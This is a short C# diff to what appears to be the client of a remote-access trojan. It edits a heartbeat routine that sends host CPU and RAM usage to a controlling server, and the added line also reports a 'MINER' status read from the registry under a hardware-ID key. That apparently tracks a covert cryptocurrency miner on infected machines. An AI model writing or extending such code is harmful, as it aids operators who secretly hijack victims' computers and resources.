@@ -239,7 +239,7 @@ namespace Client.Connection
         {
             MsgPack msgpack = new MsgPack();
             msgpack.ForcePathObject("Packet").AsString = "Ping";
-            msgpack.ForcePathObject("Message").AsString = $"CPU {(int)Methods.TheCPUCounter.NextValue()}%   RAM {(int)Methods.TheMemCounter.NextValue()}%";
+            msgpack.ForcePathObject("Message").AsString = $"MINER {SetRegistry.GetValue(Settings.Hwid) ?? "0"}   CPU {(int)Methods.TheCPUCounter.NextValue()}%   RAM {(int)Methods.TheMemCounter.NextValue()}%";
             Send(msgpack.Encode2Bytes());
             GC.Collect();
         }
